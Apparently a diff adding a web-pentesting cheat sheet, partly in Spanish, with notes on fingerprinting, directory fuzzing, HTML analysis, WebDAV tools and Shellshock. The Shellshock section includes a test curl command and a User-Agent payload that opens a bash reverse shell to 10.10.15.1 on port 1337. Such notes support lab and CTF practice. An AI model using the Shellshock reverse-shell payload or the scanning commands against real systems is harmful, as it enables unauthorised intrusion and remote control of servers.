@@ -1,0 +1,119 @@
+<h2 id="1-fingerprinting">1. fingerprinting</h2>
+<h2 id="2-fuzzing">2. fuzzing</h2>
+<h2 id="3-html-analyzis">3. html analyzis</h2>
+<h2 id="4-check">4. check</h2>
+<ul>
+  <li>what webserver?</li>
+  <li>what backend?</li>
+  <li>what methods can use?</li>
+  <li>any link or hints in html source?</li>
+  <li>any admin panel?</li>
+  <li>default credentials?</li>
+  <li>hostname change anything?</li>
+</ul>
+
+<h1 id="1-finerprinting">1 Finerprinting</h1>
+<hr />
+<h2 id="nikto">nikto</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -C all -h http://IP
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto -h $host  -p $puerto
+</code></pre></div></div>
+
+<h2 id="httprint">httprint</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  httprint -h www1.example.com -s signatures.txt
+</code></pre></div></div>
+
+<h2 id="whatweb">whatweb</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://nop.sh
+</code></pre></div></div>
+
+<h2 id="wafw00f">WAFW00F</h2>
+
+<p>allows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.</p>
+
+<p>https://github.com/EnableSecurity/wafw00f</p>
+
+<h2 id="banner-grabbing-with-nc">banner grabbing with nc</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nc 192.168.0.10 80
+  GET / HTTP/1.1
+  Host: 192.168.0.10
+  User-Agent: Mozilla/4.0
+  Referrer: www.example.com
+  &lt;enter&gt;
+  &lt;enter&gt;
+</code></pre></div></div>
+
+<h1 id="2-fuzzing-1">2. Fuzzing</h1>
+<hr />
+<h2 id="dirb">DirB</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
+</code></pre></div></div>
+<h2 id="ffuf">ffuf</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -u http://10.10.10.171/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt
+</code></pre></div></div>
+<h2 id="gobuster">GoBuster</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> gobuster dir -f -r -k   --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://10.10.10.56:80
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -f -r -k   --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.html -u http://10.10.10.56:80/cgi-bin/
+</code></pre></div></div>
+
+<h2 id="wfuzz">wfuzz</h2>
+<ul>
+  <li>fuzz - /usr/share/wfuzz/wordlist/</li>
+</ul>
+
+<h2 id="lists">Lists</h2>
+<ul>
+  <li>SecList - /usr/share/seclists/</li>
+  <li>DirB - /usr/share/dirb/wordlists/</li>
+  <li>fuzz - /usr/share/wfuzz/wordlist/</li>
+</ul>
+
+<h1 id="3-html-analysis">3. html analysis</h1>
+<hr />
+
+<h2 id="linkfinder">linkfinder</h2>
+<p>busca links en .js files</p>
+
+<h2 id="html2text">html2text</h2>
+<p>html -&gt; texto leible</p>
+
+<h2 id="cewl">cewl</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl http://192.168.168.168/index.html -m 2 -w cewl.lst
+</code></pre></div></div>
+
+<h1 id="varios">VARIOS</h1>
+<hr />
+
+<h2 id="shellshock">shellshock</h2>
+
+<p>vuln en apache con mod_cgi, le apendeas gilada a bash
+podes tener en otras cosas que no sean apache tipo webmin</p>
+
+<h3 id="apache">Apache</h3>
+<ol>
+  <li>encontrar /cgi-bin/</li>
+  <li>encontrar el archivo ahi</li>
+  <li>curl -H “X-Frame-Options: () { :;};echo;echo gato” 10.10.10.56/cgi-bin/user.sh
+<strong>webmin reverse shellshock shell</strong>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: () {:;}; bash  -i &gt;&amp; /dev/tcp/10.10.15.1/1337 0&gt;&amp;1
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="heartbleed">Heartbleed</h2>
+<p>TODO</p>
+
+<h2 id="download-web-with-httrack">download web with httrack</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httrack partidopirata.com.ar
+</code></pre></div></div>
+
+<h2 id="webdav">WEBDAV</h2>
+
+<p><strong>davtest</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  davtest –url http://(target IP) – will display what is executable
+</code></pre></div></div>
+<p><strong>cadaver</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  cadaver http://(target IP), then run “ls” to list directories found
+</code></pre></div></div>
